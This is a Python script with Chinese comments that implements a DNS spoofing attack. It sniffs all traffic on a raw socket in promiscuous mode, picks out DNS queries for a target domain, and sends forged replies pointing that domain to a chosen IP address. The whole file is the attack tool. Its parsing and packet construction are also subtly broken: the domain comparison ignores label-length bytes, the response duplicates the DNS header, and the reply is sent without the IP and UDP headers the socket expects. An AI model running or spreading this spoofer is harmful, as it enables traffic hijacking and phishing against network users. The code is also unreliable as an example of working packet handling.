import socket
import struct

# 定义目标域名和IP地址
target_domain = 'www.example.com'
target_ip = '192.168.1.100'


def get_dns_header(data):
    # 解析DNS请求头部，返回标志位和查询问题数
    header = struct.unpack('!6H', data[:12])
    flags = header[1]
    qdcount = header[2]
    return flags, qdcount


def build_dns_response(transaction_id, query_data):
    # 构造DNS响应报文
    response_flags = b'\x81\x80'
    response_ancount = b'\x00\x01'
    response_nscount = b'\x00\x00'
    response_arcount = b'\x00\x00'

    # 构造DNS响应中的资源记录
    response_query = query_data
    response_answer = b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x32\x00\x04' + socket.inet_aton(target_ip)

    dns_response = transaction_id + response_flags + response_ancount + response_nscount + response_arcount + response_query + response_answer
    return dns_response


def main():
    # 创建一个原始套接字，监听所有的网络流量
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
    sock.bind(('0.0.0.0', 0))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

    while True:
        # 接收网络流量
        data, addr = sock.recvfrom(65535)

        # 解析IP头部，判断协议是否为UDP
        ip_header = data[:20]
        iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
        protocol = iph[6]
        if protocol != 17:
            continue

        # 解析UDP头部，判断是否为DNS请求
        udp_header = data[20:28]
        udph = struct.unpack('!HHHH', udp_header)
        src_port = udph[0]
        dst_port = udph[1]
        if dst_port != 53:
            continue

        # 解析DNS请求头部，判断请求域名是否为目标域名
        dns_query_data = data[28:]
        dns_flags, dns_qdcount = get_dns_header(dns_query_data)
        if dns_flags & 0x8000 == 0 and dns_qdcount == 1:
            query_data = dns_query_data[12:]
            domain = query_data.split(b'\x00', 1)[0].decode('ascii')
            if domain == target_domain:
                transaction_id = dns_query_data[:2]
                dns_response = build_dns_response(transaction_id, dns_query_data)
                sock.sendto(dns_response, addr)


if __name__ == '__main__':
    main()
